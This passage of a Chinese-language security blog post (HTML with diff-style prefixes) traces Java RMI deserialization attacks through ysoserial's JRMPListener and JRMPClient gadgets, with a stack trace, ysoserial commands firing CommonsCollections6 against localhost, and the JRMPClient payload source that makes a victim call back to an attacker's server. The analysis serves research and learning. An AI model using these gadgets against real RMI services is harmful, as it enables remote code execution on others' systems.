class="line">dispatch:-1, DGCImpl_Skel (sun.rmi.transport)</span><br><span class="line">oldDispatch:410, UnicastServerRef (sun.rmi.server)</span><br><span class="line">dispatch:268, UnicastServerRef (sun.rmi.server)</span><br><span class="line">run:200, Transport$1 (sun.rmi.transport)</span><br><span class="line">run:197, Transport$1 (sun.rmi.transport)</span><br><span class="line">doPrivileged:-1, AccessController (java.security)</span><br><span class="line">serviceCall:196, Transport (sun.rmi.transport)</span><br><span class="line">handleMessages:568, TCPTransport (sun.rmi.transport.tcp)</span><br><span class="line">run0:790, TCPTransport$ConnectionHandler (sun.rmi.transport.tcp)</span><br><span class="line">lambda$run$256:683, TCPTransport$ConnectionHandler (sun.rmi.transport.tcp)</span><br><span class="line">run:-1, 1052690258 (sun.rmi.transport.tcp.TCPTransport$ConnectionHandler$$Lambda$1)</span><br><span class="line">doPrivileged:-1, AccessController (java.security)</span><br><span class="line">run:682, TCPTransport$ConnectionHandler (sun.rmi.transport.tcp)</span><br><span class="line">runWorker:1142, ThreadPoolExecutor (java.util.concurrent)</span><br><span class="line">run:617, ThreadPoolExecutor$Worker (java.util.concurrent)</span><br><span class="line">run:745, Thread (java.lang)</span><br></pre></td></tr></table></figure>
+<p>放一下stack，我们创建的listener接受到了请求<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1703176934080-fcc50ee1-e624-4626-8ca1-0ce63910367b.png#averageHue=%23334d65&clientId=ud9a21f8b-e36e-4&from=paste&height=1089&id=ub87acbd3&originHeight=1089&originWidth=2065&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=284651&status=done&style=none&taskId=u6c216e18-3591-4869-b49b-61afbbf12a9&title=&width=2065" alt="image.png"><br>我们这其实是攻击了服务端的DGC，可以看到左下角的DGC_SKEL，然后会对请求进行原生的反序列化，也就导致了RCE。<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1703176973338-3133d771-9145-4d3e-98cf-34d8e8dd0074.png#averageHue=%235c7a70&clientId=ud9a21f8b-e36e-4&from=paste&height=824&id=u6596bcec&originHeight=824&originWidth=1102&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=93022&status=done&style=none&taskId=u95f36442-f4b7-4d6d-abc9-f1c777b54cf&title=&width=1102" alt="image.png"></p>
+<h2 id="JRMPClient-1"><a href="#JRMPClient-1" class="headerlink" title="JRMPClient"></a>JRMPClient</h2><p>payloads&#x2F;JRMPClient，这个gadgets是最常用的也是实战意义比较大的一个。它可以让反序列化点主动发起一个JRMP请求，然后我们配合exploit&#x2F;JRMPListener开启一个监听。这样的话就可以成功的让client被攻击。是一种主动请求的方式。</p>
+<h3 id="流程分析-2"><a href="#流程分析-2" class="headerlink" title="流程分析"></a>流程分析</h3><p><code>java -cp ysoserial-all.jar ysoserial.exploit.JRMPClient 127.0.0.1 7777 CommonsCollections6 calc</code><br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1703231727648-4e517bff-c280-4478-91f0-3c7b4a8733f9.png#averageHue=%23292d34&clientId=udefe1118-b9a4-4&from=paste&height=746&id=u441ab5cd&originHeight=932&originWidth=1752&originalType=binary&ratio=1&rotation=0&showTitle=false&size=196989&status=done&style=none&taskId=u5ec2927f-5554-4385-92e0-ec39c042ab7&title=&width=1401.6" alt="image.png"><br><code> java -jar ysoserial-all.jar JRMPClient 127.0.0.1:8888|base64</code><br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1703231754106-975a7af3-7857-42dd-9bc2-707c65eefb4d.png#averageHue=%235f636e&clientId=udefe1118-b9a4-4&from=paste&height=110&id=u8f080803&originHeight=137&originWidth=1063&originalType=binary&ratio=1&rotation=0&showTitle=false&size=240473&status=done&style=none&taskId=u4a48c112-1fd4-4a16-a16b-6f51cc38cb2&title=&width=850.4" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1703231731763-ecf10189-7843-4402-add3-83b1b4bc08f8.png#averageHue=%23233c36&clientId=udefe1118-b9a4-4&from=paste&height=702&id=u39f1102d&originHeight=878&originWidth=1803&originalType=binary&ratio=1&rotation=0&showTitle=false&size=79171&status=done&style=none&taskId=u3511cbb5-4e42-4abb-805c-d15a34f07d2&title=&width=1442.4" alt="image.png"><br>成功弹出计算机，这个方法的原理刚刚也说了，我们逆向跟一下流程。首先我们看一下Yso的payloads怎么构造的</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> Registry <span class="title function_">getObject</span> <span class="params">( <span class="keyword">final</span> String command )</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line"></span><br><span class="line">        String host;</span><br><span class="line">        <span class="type">int</span> port;</span><br><span class="line">        <span class="type">int</span> <span class="variable">sep</span> <span class="operator">=</span> command.indexOf(<span class="string">&#x27;:&#x27;</span>);</span><br><span class="line">        <span class="keyword">if</span> ( sep &lt; <span class="number">0</span> ) &#123;</span><br><span class="line">            port = <span class="keyword">new</span> <span class="title class_">Random</span>().nextInt(<span class="number">65535</span>);</span><br><span class="line">            host = command;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            host = command.substring(<span class="number">0</span>, sep);</span><br><span class="line">            port = Integer.valueOf(command.substring(sep + <span class="number">1</span>));</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">ObjID</span> <span class="variable">id</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjID</span>(<span class="keyword">new</span> <span class="title class_">Random</span>().nextInt()); <span class="comment">// RMI registry</span></span><br><span class="line">        <span class="type">TCPEndpoint</span> <span class="variable">te</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TCPEndpoint</span>(host, port);</span><br><span class="line">        <span class="type">UnicastRef</span> <span class="variable">ref</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">UnicastRef</span>(<span class="keyword">new</span> <span class="title class_">LiveRef</span>(id, te, <span class="literal">false</span>));</span><br><span class="line">        <span class="type">RemoteObjectInvocationHandler</span> <span class="variable">obj</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">RemoteObjectInvocationHandler</span>(ref);</span><br><span class="line">        <span class="type">Registry</span> <span class="variable">proxy</span> <span class="operator">=</span> (Registry) Proxy.newProxyInstance(JRMPClient.class.getClassLoader(), <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123;</span><br><span class="line">            Registry.class</span><br><span class="line">        &#125;, obj);</span><br><span class="line">        <span class="keyword">return</span> proxy;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+<p>他用了一个<code>RemoteObjectInvocationHandler</code>去包裹我们的<code>UnicastRef</code>，然后在<code>RemoteObjectInvocationHandler</code>时<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1703231840740-bed2fc4b-ee18-4374-8a0a-feb485bc9b25.png#averageHue=%232b2f35&clientId=udefe1118-b9a4-4&from=paste&height=447&id=u3054373f&originHeight=559&originWidth=2371&originalType=binary&ratio=1&rotation=0&showTitle=false&size=141826&status=done&style=none&taskId=u6992db8b-6ac3-48a4-b709-930af2c7894&title=&width=1896.8" alt="image.png"><br>调用了UnicastRef的<code>readExternal</code>方法。<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1703231871599-c7fb457c-173c-4966-949b-2c7c4a83aacf.png#averageHue=%23292d35&clientId=udefe1118-b9a4-4&from=paste&height=706&id=ud92f0560&originHeight=882&originWidth=1628&originalType=binary&ratio=1&rotation=0&showTitle=false&size=111972&status=done&style=none&taskId=u9911a13f-6e2f-478b-a829-b7c1c72bda0&title=&width=1302.4" alt="image.png"><br>调用了LiveRef的read<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1703231929395-571706cc-79e3-44ca-8438-7c95db915951.png#averageHue=%23292f39&clientId=udefe1118-b9a4-4&from=paste&height=127&id=u1354e399&originHeight=159&originWidth=1028&originalType=binary&ratio=1&rotation=0&showTitle=false&size=19262&status=done&style=none&taskId=u0914eae7-6cf2-490d-99e9-3472257a770&title=&width=822.4" alt="image.png"><br><code>DGCClient.registerRefs</code>，到了DGC处理部分了。</p>
+<blockquote>
+<p>在之前的调试过程中，也曾看到过 DGC 相关的代码，不过没有分析，统一在这里来说。<br>DGC（Distributed Garbage Collection）—— 分布式垃圾回收，当 Server 端返回一个对象到 Client 端（远程方法的调用方）时，其跟踪远程对象在 Client 端中的使用。当再没有更多的对 Client 远程对象的引用时，或者如果引用的“租借”过期并且没有更新，服务器将垃圾回收远程对象。启动一个 RMI 服务，就会伴随着 DGC 服务端的启动。<br>RMI 定义了一个 java.rmi.dgc.DGC 接口，提供了两个方法 dirty 和 clean：</p>
+<ul>
+<li>客户端想要使用服务端上的远程引用，使用 dirty 方法来注册一个。同时这还跟租房子一样，过段时间继续用的话还要再调用一次来续租。</li>
+<li>客户端不使用的时候，需要调用 clean 方法来清楚这个远程引用。</li>
+</ul>
+</blockquote>
+<p>这个接口有两个实现类，分别是 sun.rmi.transport.DGCImpl 以及 sun.rmi.transport.DGCImpl_Stub，同时还定义了 sun.rmi.transport.DGCImpl_Skel。</p>
+<blockquote>
+<p>引自Su18</p>
+</blockquote>
+<p>这里是客户端DGC注册Ref<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1703232064242-8c00e78c-8d34-4472-8291-5edcb67f51b9.png#averageHue=%232e323b&clientId=udefe1118-b9a4-4&from=paste&height=613&id=ue77a2142&originHeight=766&originWidth=1301&originalType=binary&ratio=1&rotation=0&showTitle=false&size=112520&status=done&style=none&taskId=ub34086b4-2d58-4ff5-8778-7f307d5214e&title=&width=1040.8" alt="image.png"><br>进入<code>registerRefs</code><br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1703232088623-d4e91f7c-5508-450a-a868-dfcdf45f1ad7.png#averageHue=%2330333a&clientId=udefe1118-b9a4-4&from=paste&height=424&id=ua1416a2f&originHeight=530&originWidth=1547&originalType=binary&ratio=1&rotation=0&showTitle=false&size=73868&status=done&style=none&taskId=u60fc9009-107c-4ae6-a3dd-cb679803613&title=&width=1237.6" alt="image.png"><br>在这里要发起DirtyCall了。<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1703232161438-713be3bf-cfe2-4731-aebf-f52b4c43cc37.png#averageHue=%232a2e35&clientId=udefe1118-b9a4-4&from=paste&height=452&id=ub53066b7&originHeight=565&originWidth=1416&originalType=binary&ratio=1&rotation=0&showTitle=false&size=84263&status=done&style=none&taskId=u80c54bc4-a567-4c8a-987b-7b5a674c13b&title=&width=1132.8" alt="image.png"><br>dirty方法发起请求<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1703232184253-b9c4d7dd-799d-42f3-bd90-9a5b71a27bfe.png#averageHue=%232a2e35&clientId=udefe1118-b9a4-4&from=paste&height=678&id=u5d0ea853&originHeight=848&originWidth=1499&originalType=binary&ratio=1&rotation=0&showTitle=false&size=126854&status=done&style=none&taskId=ud32b0520-5934-48d3-82c4-5c8245050e8&title=&width=1199.2" alt="image.png"><br>进而回到了UnicastRef的newcall方法发起请求<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1703232201163-135a501e-8894-4725-8e77-215888123fa2.png#averageHue=%232f333e&clientId=udefe1118-b9a4-4&from=paste&height=410&id=u542cdd8e&originHeight=513&originWidth=1878&originalType=binary&ratio=1&rotation=0&showTitle=false&size=91738&status=done&style=none&taskId=u5b2a87f7-0538-40d3-bd9b-7d5ebee75e0&title=&width=1502.4" alt="image.png"><br>至此完成主动访问Evil server的流程，Evil server返回payload给客户端进行Deser<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1703232248386-3bfd5059-439f-44a7-ace5-d149d5dbfcc7.png#averageHue=%232a2e35&clientId=udefe1118-b9a4-4&from=paste&height=585&id=u46d2390e&originHeight=731&originWidth=1708&originalType=binary&ratio=1&rotation=0&showTitle=false&size=112851&status=done&style=none&taskId=uacdf3211-6a06-4d13-bd98-0170b06f330&title=&width=1366.4" alt="image.png"><br>结束。</p>
+<h1 id="Summary"><a href="#Summary" class="headerlink" title="Summary"></a>Summary</h1><p>还是感觉Yso这2个payload是挺有意思的，大家可以自己去尝试尝试，别搞混淆了，JRMP是RMI具有实战意义的gadgets，分析其中的流程可以让大家更好的理解RMI发序列化。到这里也算给自己的RMI做个小结。</p>
+
+    </div>
+
+    
+    <div class="about">
+        <h1>About this Post</h1>
+        <div class="details">
+            <p>This post is written by Boogipop, licensed under <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc/4.0">CC BY-NC 4.0</a>.</p>
+        </div>
+        
+        <p class="tags">
+            
+            <i class="icon"></i>
+            <a href="/tags/Java/" class="tag">#Java</a><a href="/tags/RMI/" class="tag">#RMI</a>
+        </p>
+        
+    </div>
+    
+
+    <div class="container post-prev-next">
+        
+        <a href="/2024/03/08/CVE-2020-9496%20Apache%20OfBiz%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/" class="next">
+            <div>
+                <div class="text">
+                    <p class="label">Next</p>
+                    <h3 class="title">CVE-2020-9496 Apache OfBiz 反序列化命令执行漏洞</h3>
+                </div>
+            </div>
+        </a>
+        
+        
+        <a href="/2024/02/29/Oracle%20%E6%B3%A8%E5%85%A5%20RCE%20%E7%94%B1%E6%B5%85%E5%85%A5%E6%B7%B1/" class="prev">
+            <div>
+                <div class="text">
+                    <p class="label">Previous</p>
+                    <h3 class="title">Oracle 注入 RCE 由浅入深</>
+                </div>
+            </div>
+        </a>
+        
+    </div>
+
+    
+        
+        
+        <script src="https://giscus.app/client.js" data-repo="Boogipop/Boogipop.github.io" data-repo-id="R_kgDOIFi78g" data-category="Announcements" data-category-id="DIC_kwDOIFi78s4Cav9f" data-mapping="pathname" data-strict="1" data-reactions-enabled="1" data-emit-metadata="0" data-input-position="top" data-theme="preferred_color_scheme" data-lang="zh-CN" crossorigin="anonymous" async></script>
+        
+    
+</article>
+
+        <footer>
+    <div class="inner">
+        <div class="links">
+            
+            <div class="group">
+                <h2 class="title">Blog</h2>
+                
+                <a href="/" class="item">Blog</a>
+                
+                <a href="/archives" class="item">Archives</a>
+                
+                <a href="/tags" class="item">Tags</a>
+                
+                <a href="/categories" class="item">Categories</a>
+                
+                <a href="/search" class="item">Search</a>
+                
+                <a href="/friends" class="item">Friends</a>
+                
+                <a href="/about" class="item">About</a>
+                
+                <a href="/atom.xml" class="item">RSS</a>
+                
+            </div>
+            
+            <div class="group">
+                <h2 class="title">Projects</h2>
+                
+                <a target="_blank" rel="noopener" href="https://github.com/MrWillCom/rsa-cli" class="item">RSA CLI</a>
+                
+                <a target="_blank" rel="noopener" href="https://github.com/MrWillCom/hexo-theme-cupertino" class="item">Hexo Theme Cupertino</a>
+                
+                <a target="_blank" rel="noopener" href="https://github.com/MrWillCom/a-calendar" class="item">A Calendar</a>
+                
+                <a target="_blank" rel="noopener" href="https://github.com/MrWillCom/auto-mirroring-bucket" class="item">Auto Mirroring Bucket</a>
+                
+            </div>
+            
+            <div class="group">
+                <h2 class="title">Me</h2>
+                
+                <a target="_blank" rel="noopener" href="https://github.com/MrWillCom" class="item">GitHub</a>
+                
+                <a target="_blank" rel="noopener" href="https://codepen.io/mrwillcom" class="item">CodePen</a>
+                
+                <a target="_blank" rel="noopener" href="https://www.patreon.com/MrWillCom" class="item">Patreon</a>
+                
+                <a target="_blank" rel="noopener" href="https://noc.social/@MrWillCom" class="item">Mastodon</a>
+                
+                <a target="_blank" rel="noopener" href="https://discord.gg/UKuFDjcfY8" class="item">Discord</a>
+                
+                <a href="mailto:mr.will.com@outlook.com" class="item">Email</a>
+                
+            </div>
+            
+        </div>
+        <span>&copy; 2024 Boogipop<br>Powered by <a href="http://hexo.io/" target="_blank">Hexo</a> </span>
+        
+        
+            <br>
+            <div class="color-scheme-toggle" role="radiogroup" id="theme-color-scheme-toggle">
+                <label>
+                    <input type="radio" value="light">
+                    <span>Light</span>
+                </label>
+                <label>
+                    <input type="radio" value="dark">
+                    <span>Dark</span>
+                </label>
+                <label>
+                    <input type="radio" value="auto">
+                    <span>Auto</span>
+                </label>
+            </div>
+        
+    </div>
+</footer>
+
+
+        
+<script src="/js/main.js"></script>
+
+        
+        
+        
+
+        
+        <script src="https://unpkg.com/scrollreveal"></script>
+		
+        <script>
+            window.addEventListener('load', () => {
+                ScrollReveal({ delay: 250, reset: true, easing: 'cubic-bezier(0, 0, 0, 1)' })
+                ScrollReveal().reveal('.post-list-item .cover-img img')
+                ScrollReveal().reveal('.post-list-item, .card, .content p img, .content .block-large img', { distance: '60px', origin: 'bottom', duration: 800 })
+            })
+        </script>
+        
+    </body>
+</html>
